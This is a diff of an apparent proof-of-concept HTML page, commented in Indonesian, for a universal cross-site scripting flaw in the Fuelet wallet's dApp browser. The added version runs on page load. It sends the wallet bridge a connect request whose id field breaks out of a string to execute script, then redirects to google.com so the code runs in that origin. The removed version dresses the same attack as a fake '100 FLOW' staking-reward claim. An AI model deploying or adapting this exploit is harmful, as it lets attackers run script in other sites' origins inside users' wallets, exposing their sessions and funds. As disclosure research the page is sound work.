@@ -1,95 +1,48 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flow Rewards Program</title>
-    <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-color: #0b0e11; 
-            color: #ffffff; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .container {
-            text-align: center;
-            padding: 40px;
-            background: #1e2329;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            border: 1px solid #00ef8b;
-            max-width: 350px;
-        }
-        h1 { color: #00ef8b; font-size: 24px; }
-        p { color: #848e9c; margin-bottom: 30px; }
-        .exploit-btn {
-            background-color: #00ef8b;
-            color: #000000;
-            padding: 15px 32px;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: transform 0.2s;
-            text-decoration: none;
-            display: inline-block;
-        }
-        .exploit-btn:active { transform: scale(0.95); }
-    </style>
+    <title>PoC UXSS Fuelet</title>
 </head>
 <body>
+    <h1>Menghubungkan ke dApp...</h1>
+    <p>Jika tidak berpindah otomatis, <button onclick="runExploit()">Klik di sini</button></p>
 
-<div class="container">
-    <img src="https://cryptologos.cc/logos/flow-flow-logo.png" width="80" alt="Flow Logo">
-    <h1>Bonus Staking Terdeteksi!</h1>
-    <p>Klik tombol di bawah untuk mengklaim 100 FLOW ke dompet Anda.</p>
-    
-    <button class="exploit-btn" onclick="claimRewards()">CLICK HERE TO CLAIM</button>
-</div>
+    <script>
+        function runExploit() {
+            // Payload ini dirancang untuk:
+            // 1. Menutup argumen pertama fungsi: ")
+            // 2. Menjalankan alert: ;alert(origin);
+            // 3. Menetralkan sisa kode setelahnya dengan comment: //
+            const payloadId = '");alert("Kena XSS di: " + location.origin);//';
 
-<script>
-    function claimRewards() {
-        // Target navigasi (situs korban dimana JavaScript akan dieksekusi)
-        const targetVictim = "https://www.google.com";
+            const requestData = {
+                type: 'request',
+                target: 'FuelContentScript',
+                connectorName: 'Fuelet Wallet',
+                request: {
+                    jsonrpc: '2.0',
+                    id: payloadId,
+                    method: 'connect',
+                    params: {}
+                }
+            };
 
-        // Payload UXSS yang memanfaatkan kurangnya escaping pada idfield
-        // Struktur: ",alert(origin),"
-        const maliciousId = '",alert("UXSS EXPLOITED! \n\nScript dijalankan pada Origin: " + window.location.origin),"';
-
-        // Menyiapkan pesan permintaan sesuai format dApp
-        const payload = {
-            type: 'request',
-            target: 'FlowContentScript',
-            request: {
-                jsonrpc: '2.0',
-                id: maliciousId, // Injeksi pada parameter ID
-                method: 'connect',
-                params: {}
+            // LANGKAH 1: Kirim pesan ke Native (Flutter)
+            if (window.FueletWallet) {
+                window.FueletWallet.postMessage(JSON.stringify(requestData));
+                
+                // LANGKAH 2: Segera pindah ke domain target (korban)
+                // Kita beri jeda 100ms agar postMessage selesai diproses oleh sistem
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                }, 100);
+            } else {
+                alert("Objek FueletWallet tidak ditemukan. Buka di browser dompet!");
             }
-        };
-
-        // Deteksi objek wallet (FCL atau shim native)
-        const wallet = window.FueletWallet  window.FlowWallet  window.fcl;
-
-        if (wallet) {
-            // 1. Kirim pesan ke Native (Trigger sendResponseToJs)
-            wallet.postMessage(JSON.stringify(payload));
-
-            // 2. Navigasi cepat ke origin korban
-            // Ini memastikan saat sendResponseToJs dipanggil, kita sudah berada di origin target
-            setTimeout(() => {
-                window.location.href = targetVictim;
-            }, 100); 
-        } else {
-            alert("Gunakan Browser dApp di Dompet Anda untuk klaim!");
         }
-    }
-</script>
 
+        // Jalankan otomatis saat halaman dimuat
+        window.onload = runExploit;
+    </script>
 </body>
 </html>
